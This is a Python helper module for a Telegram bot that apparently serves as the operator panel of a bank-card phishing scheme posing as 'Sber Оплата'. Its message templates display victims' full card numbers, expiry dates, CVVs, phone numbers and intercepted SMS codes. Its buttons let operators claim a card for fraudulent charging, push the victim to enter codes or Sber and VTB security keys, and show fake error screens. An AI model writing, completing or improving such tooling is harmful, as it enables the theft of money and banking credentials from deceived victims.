# ============================================
# УТИЛИТЫ - Сообщения, клавиатуры, хелперы
# ============================================

import aiohttp
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder

from config import BIN_DATABASE, FIRST_ERRORS, CODE_ERRORS
from database import Log, Code

# ============================================
# ОПРЕДЕЛЕНИЕ БАНКА ПО BIN
# ============================================

async def get_bank_by_bin(card_number: str) -> str:
    """Определение банка по BIN (первые 6 цифр карты)"""
    card = card_number.replace(' ', '').replace('-', '')[:6]
    
    # Сначала проверяем локальную базу
    for prefix, bank in BIN_DATABASE.items():
        if card.startswith(prefix):
            return bank
    
    # Если не нашли - пробуем API
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=3)) as session:
            async with session.get(f"https://lookup.binlist.net/{card}") as response:
                if response.status == 200:
                    data = await response.json()
                    bank_name = data.get('bank', {}).get('name', 'Неизвестно')
                    return bank_name
    except:
        pass
    
    return "Неизвестный банк"

def get_device_info(user_agent: str) -> str:
    """Определение устройства по User-Agent"""
    ua = user_agent.lower()
    if 'android' in ua:
        return 'Android 📱'
    elif 'iphone' in ua:
        return 'iPhone 📱'
    elif 'ipad' in ua:
        return 'iPad 📱'
    elif 'windows' in ua:
        return 'Windows 💻'
    elif 'mac' in ua:
        return 'MacOS 💻'
    elif 'linux' in ua:
        return 'Linux 💻'
    return 'Unknown'

def mask_card(card: str) -> str:
    """Маскирование карты: **** **** **** 1234"""
    clean = card.replace(' ', '').replace('-', '')
    if len(clean) >= 4:
        return f"**** **** **** {clean[-4:]}"
    return card

# ============================================
# ФОРМАТИРОВАНИЕ СООБЩЕНИЙ
# ============================================

def format_log_message(log: Log, service_name: str = "Sber Оплата", amount: int = 15000) -> str:
    """Сообщение для нового лога карты"""
    return f"""<b>🟧 | Лог карты</b>
<b>Сумма платежа:</b> {amount} RUB

<b>💳 Карта:</b> <code>{log.card_number}</code>
<b>📅 Срок:</b> {log.card_expiry or '-'}
<b>🔒 CVV:</b> <code>{log.cvv or '-'}</code>
<b>📞 Телефон:</b> <code>{log.phone or '-'}</code>

<b>🔹 Лог не взят на вбив</b>

<b>🏦 Банк:</b> {log.bank or 'Определяется...'}
<b>💵 Баланс:</b> {log.balance or 'Не указан'}

<b>📱 Устройство:</b> {log.device or '-'}
<b>⚙️ Сервис:</b> {service_name}
<b>🆔 ID:</b> #{log.id}"""

def format_taken_log_message(log: Log, service_name: str = "Sber Оплата", amount: int = 15000) -> str:
    """Сообщение для взятого лога"""
    return f"""<b>🟩 | Лог карты</b>
<b>Сумма платежа:</b> {amount} RUB

<b>💳 Карта:</b> <code>{log.card_number}</code>
<b>📅 Срок:</b> {log.card_expiry or '-'}
<b>🔒 CVV:</b> <code>{log.cvv or '-'}</code>
<b>📞 Телефон:</b> <code>{log.phone or '-'}</code>

<b>🟢 Вбивает:</b> @{log.handler_name}

<b>🏦 Банк:</b> {log.bank or 'Определяется...'}
<b>💵 Баланс:</b> {log.balance or 'Не указан'}

<b>📱 Устройство:</b> {log.device or '-'}
<b>⚙️ Сервис:</b> {service_name}
<b>🆔 ID:</b> #{log.id}"""

def format_repeat_log_message(log: Log, service_name: str = "Sber Оплата", amount: int = 15000) -> str:
    """Сообщение для повторного перехода"""
    return f"""<b>🔄 | ПОВТОРНЫЙ ПЕРЕХОД</b>
<b>Сумма платежа:</b> {amount} RUB

<b>💳 Карта:</b> <code>{log.card_number}</code>
<b>📅 Срок:</b> {log.card_expiry or '-'}
<b>🔒 CVV:</b> <code>{log.cvv or '-'}</code>
<b>📞 Телефон:</b> <code>{log.phone or '-'}</code>

<b>🟢 Вбивает:</b> @{log.handler_name}

<b>🏦 Банк:</b> {log.bank or 'Определяется...'}

<b>⚙️ Сервис:</b> {service_name}
<b>🆔 ID:</b> #{log.id}"""

def format_code_message(log: Log, code: str, service_name: str = "Sber Оплата", amount: int = 15000) -> str:
    """Сообщение с кодом"""
    return f"""<b>⚠️ | Лог кода</b>
<b>Сумма платежа:</b> {amount} RUB

<b>💳 Карта:</b> <code>{log.card_number}</code>
<b>📅 Срок:</b> {log.card_expiry or '-'}
<b>🔒 CVV:</b> <code>{log.cvv or '-'}</code>
<b>📞 Телефон:</b> <code>{log.phone or '-'}</code>

<b>📨 СМС Код:</b> <code>{code}</code>

<b>🟢 Вбивает:</b> @{log.handler_name}
<b>🏦 Банк:</b> {log.bank or '-'}

<b>⚙️ Сервис:</b> {service_name}
<b>🆔 ID:</b> #{log.id}"""

# ============================================
# КЛАВИАТУРЫ
# ============================================

def get_new_log_keyboard(log_id: int) -> InlineKeyboardMarkup:
    """Клавиатура для нового лога"""
    builder = InlineKeyboardBuilder()
    
    # Взять лог
    builder.row(InlineKeyboardButton(
        text="🔴 Взять на вбив",
        callback_data=f"take_log:{log_id}"
    ))
    
    # Основные ошибки
    builder.row(
        InlineKeyboardButton(text="💳 ЗАМЕНИТЬ БАНК", callback_data=f"first_error:0:{log_id}"),
        InlineKeyboardButton(text="💳 КАРТА ЗАНОВО", callback_data=f"first_error:1:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="👆 Точный баланс", callback_data=f"first_error:3:{log_id}"),
        InlineKeyboardButton(text="💵 Баланс 2.0", callback_data=f"first_error:2:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🦸‍♂️ Ошибка ТП", callback_data=f"first_error:4:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🚫 Заблокировать", callback_data=f"block_log:{log_id}")
    )
    
    return builder.as_markup()

def get_repeat_log_keyboard(log_id: int) -> InlineKeyboardMarkup:
    """Клавиатура для повторного перехода"""
    builder = InlineKeyboardBuilder()
    
    builder.row(InlineKeyboardButton(
        text="🔄 | ПОВТОРНЫЙ ПЕРЕХОД",
        callback_data="_"
    ))
    builder.row(InlineKeyboardButton(
        text="⚠️ ОТПРАВИТЬ КЛИЕНТА НА КОД ⚠️",
        callback_data=f"redirect_to_code:{log_id}"
    ))
    builder.row(InlineKeyboardButton(
        text="⚠️ Задать секретный вопрос ⚠️",
        callback_data=f"ask_question:{log_id}"
    ))
    
    # Ошибки
    builder.row(
        InlineKeyboardButton(text="💳 ЗАМЕНИТЬ БАНК", callback_data=f"first_error:0:{log_id}"),
        InlineKeyboardButton(text="💳 КАРТА ЗАНОВО", callback_data=f"first_error:1:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="👆 Точный баланс", callback_data=f"first_error:3:{log_id}"),
        InlineKeyboardButton(text="💵 Баланс 2.0", callback_data=f"first_error:2:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🚫 Заблокировать", callback_data=f"block_log:{log_id}")
    )
    
    return builder.as_markup()

def get_code_keyboard(code_id: int, log_id: int) -> InlineKeyboardMarkup:
    """Клавиатура для лога кода"""
    builder = InlineKeyboardBuilder()
    
    # Основные действия
    builder.row(
        InlineKeyboardButton(text="🦸‍♂️ Ошибка ТП", callback_data=f"code_error:0:{code_id}"),
        InlineKeyboardButton(text="👆 Точный баланс", callback_data=f"code_error:1:{code_id}")
    )
    builder.row(
        InlineKeyboardButton(text="❌ Неверный код", callback_data=f"code_error:2:{code_id}"),
        InlineKeyboardButton(text="💵 Баланс 2.0", callback_data=f"code_error:3:{code_id}")
    )
    builder.row(
        InlineKeyboardButton(text="⛔ Карта не поддерживается", callback_data=f"code_error:4:{code_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🐸 Ошибка 900", callback_data=f"code_error:5:{code_id}")
    )
    
    # Ключи безопасности
    builder.row(
        InlineKeyboardButton(text="🔑 Ключ безопасности (Сбер) 🟩", callback_data=f"security_key:sber:{code_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🔑 Ключ безопасности (ВТБ) 🟦", callback_data=f"security_key:vtb:{code_id}")
    )
    
    # Контрольный вопрос
    builder.row(
        InlineKeyboardButton(text="❓ Контрольный вопрос ❓", callback_data=f"control_question:{code_id}")
    )
    
    # Успех
    builder.row(
        InlineKeyboardButton(text="✅ УСПЕХ ✅", callback_data=f"success:{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🚫 Заблокировать", callback_data=f"block_log:{log_id}")
    )
    
    return builder.as_markup()

def get_password_keyboard(password_id: int) -> InlineKeyboardMarkup:
    """Клавиатура для ключа безопасности"""
    builder = InlineKeyboardBuilder()
    
    builder.row(
        InlineKeyboardButton(text="❌ НЕВЕРНЫЙ КЛЮЧ ❌", callback_data=f"password:BAD:{password_id}")
    )
    builder.row(
        InlineKeyboardButton(text="📟 Выбросить на код 📟", callback_data=f"password:CODE:{password_id}")
    )
    builder.row(
        InlineKeyboardButton(text="⬅️ Выбросить назад ⬅️", callback_data=f"password:BACK:{password_id}")
    )
    builder.row(
        InlineKeyboardButton(text="✅ Подтвердить ✅", callback_data=f"password:OK:{password_id}")
    )
    
    return builder.as_markup()

def get_taken_keyboard(log_id: int) -> InlineKeyboardMarkup:
    """Клавиатура после взятия лога"""
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="🟢 Лог взят",
        callback_data="_"
    ))
    return builder.as_markup()

def get_error_keyboard(error_text: str) -> InlineKeyboardMarkup:
    """Клавиатура после отправки ошибки"""
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text=f"❌ {error_text[:30]}...",
        callback_data="_"
    ))
    return builder.as_markup()
